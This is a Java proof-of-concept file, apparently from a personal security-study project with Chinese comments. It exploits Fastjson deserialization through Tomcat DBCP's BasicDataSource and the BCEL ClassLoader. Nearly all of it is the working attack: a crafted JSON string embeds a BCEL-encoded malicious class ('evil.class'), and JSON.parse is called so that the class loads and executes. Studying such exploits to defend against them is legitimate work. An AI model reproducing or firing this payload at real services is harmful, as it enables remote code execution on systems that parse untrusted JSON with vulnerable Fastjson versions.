package fastjson;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.util.ClassLoader;

import java.io.*;

public class FastJsonBcel {
    public static void main(String[] args) throws Exception {
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = convert("D:\\java_project\\JavaSecurityStudy\\target\\classes\\CommonCollections\\evil.class");
//        String code = Utility.encode(bytes,true);
        String code = "$l$8b$I$A$A$A$A$A$A$AuQ$cbn$daP$Q$3d$X$M6$8e$J$8f$U$f2h$9e$7d$C$L$yu$L$ea$a6J7u$93$wD$e9$fa$fa$e6$8a$5e062$97$88$3f$ea$9a$N$ad$ba$e8$H$f4$a3$aa$ccu$9eRZK$9e$f1$9c$99s$e6$8c$fc$e7$ef$af$df$A$de$e1$8d$L$H$9b$$$b6$b0$ed$60$c7$e4$e76v$5d$U$b0gc$df$c6$BC$b1$afb$a5$df3$e4$5b$ed$L$G$ebCr$v$Z$w$81$8a$e5$c9$7c$S$ca$f4$9c$87$R$n$f5$m$R$3c$ba$e0$a92$f5$zh$e9oj$c6$b0$j$88d$e2_$f2t$y$d30Y$f8$a1$90$91$7f$7c$a5$a2$k$83$d3$X$d1$ed$GF$8cF0$e2W$dc$8fx$3c$f4$8f$XBN$b5Jb$g$x$P4$X$e3$cf$7c$9a$v$93I$Gw$90$ccS$n$3f$w$b3$a9d$e4$ba$86$eb$a1$E$d7$c6$a1$87$p$bc$m$7dr$r$bar$n$3d$bc$c4$x$86$8d$7f$e8$7bx$N$97a$f3$3f$$$Z$aa$P$a4$d3p$q$85f$a8$3d$40g$f3X$ab$J$99p$87R$df$X$8dV$3bx2C$97X$e4E0$bcm$3d$ea$Ot$aa$e2a$ef1$e1K$9a$I9$9b$R$a12$a5$a6$ce$ee$3fO$b9$90t$97M$bf$cd$3c90s$z$c55$aa$7c$ca$8cr$a1$f3$Dl$99$b5$3d$8a$c5$M$cc$a3L$d1$bb$Z$c0$3a$w$94$jT$ef$c9$3c$T$D$ea$3f$91$ab$e7W$b0$be$7e$87$f3$a9$b3Bq$99$e1$r$e2$WH$c5$u6$e9$cb$e8$962$d4$se$H5R$ba$dbP$86Eu$9d$aa$Nzm$e4$C$h$cf$yj42S$cdk$dfl$i$C$80$C$A$A";
//        classLoader.loadClass("$$BCEL$$"+code).newInstance();


        String s = "{\n" +
                "    {\n" +
                "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "        \"aaa\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbn$daP$Q$3d$X$M6$8e$J$8f$U$f2h$9e$7d$C$L$yu$L$ea$a6J7u$93$wD$e9$fa$fa$e6$8a$5e062$97$88$3f$ea$9a$N$ad$ba$e8$H$f4$a3$aa$ccu$9eRZK$9e$f1$9c$99s$e6$8c$fc$e7$ef$af$df$A$de$e1$8d$L$H$9b$$$b6$b0$ed$60$c7$e4$e76v$5d$U$b0gc$df$c6$BC$b1$afb$a5$df3$e4$5b$ed$L$G$ebCr$v$Z$w$81$8a$e5$c9$7c$S$ca$f4$9c$87$R$n$f5$m$R$3c$ba$e0$a92$f5$zh$e9oj$c6$b0$j$88d$e2_$f2t$y$d30Y$f8$a1$90$91$7f$7c$a5$a2$k$83$d3$X$d1$ed$GF$8cF0$e2W$dc$8fx$3c$f4$8f$XBN$b5Jb$g$x$P4$X$e3$cf$7c$9a$v$93I$Gw$90$ccS$n$3f$w$b3$a9d$e4$ba$86$eb$a1$E$d7$c6$a1$87$p$bc$m$7dr$r$bar$n$3d$bc$c4$x$86$8d$7f$e8$7bx$N$97a$f3$3f$$$Z$aa$P$a4$d3p$q$85f$a8$3d$40g$f3X$ab$J$99p$87R$df$X$8dV$3bx2C$97X$e4E0$bcm$3d$ea$Ot$aa$e2a$ef1$e1K$9a$I9$9b$R$a12$a5$a6$ce$ee$3fO$b9$90t$97M$bf$cd$3c90s$z$c55$aa$7c$ca$8cr$a1$f3$Dl$99$b5$3d$8a$c5$M$cc$a3L$d1$bb$Z$c0$3a$w$94$jT$ef$c9$3c$T$D$ea$3f$91$ab$e7W$b0$be$7e$87$f3$a9$b3Bq$99$e1$r$e2$WH$c5$u6$e9$cb$e8$962$d4$se$H5R$ba$dbP$86Eu$9d$aa$Nzm$e4$C$h$cf$yj42S$cdk$dfl$i$C$80$C$A$A\"\n" +
                "        }\n" +
                "    }: \"xxx\"\n" +
                "}";
        System.out.println(s);
//      parseObject是先parse后toJSON，这样我们才能调用get方法：getConnection()
        JSON.parse(s);
    }

    private static byte[] convert(String filePath) throws IOException {
        File file = new File(filePath);

        // 检查文件是否存在
        if (!file.exists()) {
            throw new FileNotFoundException("文件未找到：" + filePath);
        }

        // 将文件内容读取到字节数组中
        try (InputStream inputStream = new FileInputStream(file)) {
            ByteArrayOutputStream byteOutput = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int bytesRead;

            while ((bytesRead = inputStream.read(buffer)) != -1) {
                byteOutput.write(buffer, 0, bytesRead);
            }

            return byteOutput.toByteArray();
        }
    }
}